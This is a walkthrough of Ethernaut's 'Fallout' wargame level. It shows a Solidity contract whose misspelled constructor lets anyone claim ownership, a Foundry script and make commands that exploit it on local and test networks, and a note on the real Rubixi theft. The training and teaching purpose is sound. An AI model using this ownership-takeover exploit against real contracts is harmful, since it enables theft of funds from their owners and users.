# Level 2 - Fallout ⏺

{% embed url="https://ethernaut.openzeppelin.com/level/2" %}

### Level Setup

{% hint style="info" %}
Claim ownership of the contract below to complete this level.

&#x20; Things that might help

* Solidity Remix IDE
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/a89c8f7832258655c09fde16e6602c78e5e99dbd/contracts/src/levels/Fallout.sol" %}

{% code lineNumbers="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```
{% endcode %}

### Exploit

The contract uses an old method of defining the constructor by (attempting) to set it as the same name as the contract. In this instance, they made a mistake and there's a typo on the "constructor" which means it's different from the contract name, and therefore wasn't run on contract creation and can be run by anyone.

1. Call the function either using an interface or a `.call` with the function signature.

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-2

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-2

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% @github-files/github-code-block url="https://github.com/EridianAlpha/ethernaut-foundry/blob/main/script/Level2.s.sol" fullWidth="false" %}

{% code lineNumbers="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

interface IFallout {
    function Fal1out() external payable;
}

// ================================================================
// │                      LEVEL 2 - FALLOUT                       │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        IFallout targetContract = IFallout(targetContractAddress);

        vm.startBroadcast();
        targetContract.Fal1out{value: 0}();
        vm.stopBroadcast();
    }
}

// contract Exploit is Script, GetInstanceAddress {
//     function run() public {
//         address targetContractAddress = getInstanceAddress();

//         // Function signature
//         bytes memory payload = abi.encodeWithSignature("Fal1out()");

//         vm.startBroadcast();
//         (bool success, ) = targetContractAddress.call{value: 0}(payload);
//         require(success, "Transaction failed");
//         vm.stopBroadcast();
//     }
// }
```
{% endcode %}

2. Submit instance... 🥳

### Completion Message

{% hint style="info" %}
That was silly wasn't it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?

Well... Not quite.

The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from 'Dynamic Pyramid' to 'Rubixi' but somehow they didn't rename the constructor method of its contract:

```solidity
contract Rubixi {
  address private owner;
  function DynamicPyramid() { owner = msg.sender; }
  function collectAllFees() { owner.transfer(this.balance) }
  ...
```

This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland.
{% endhint %}

### Notes

* This exploit occurred because before Solidity `v0.5.0` it was not mandatory to name the constructor `constructor`. This was updated with a [breaking change in the `v0.5.0` release](https://docs.soliditylang.org/en/latest/050-breaking-changes.html#constructors).
* Even though this contract uses `v0.6.0` this mistake still happened.
* Exploited contract: [https://etherscan.io/address/0xe82719202e5965Cf5D9B6673B7503a3b92DE20be](https://etherscan.io/address/0xe82719202e5965Cf5D9B6673B7503a3b92DE20be)

{% embed url="https://github.com/nvnx7/ethernaut-openzeppelin-hacks/blob/e936301859334383d568a614084917100319205e/level_2_Fallout.md" %}
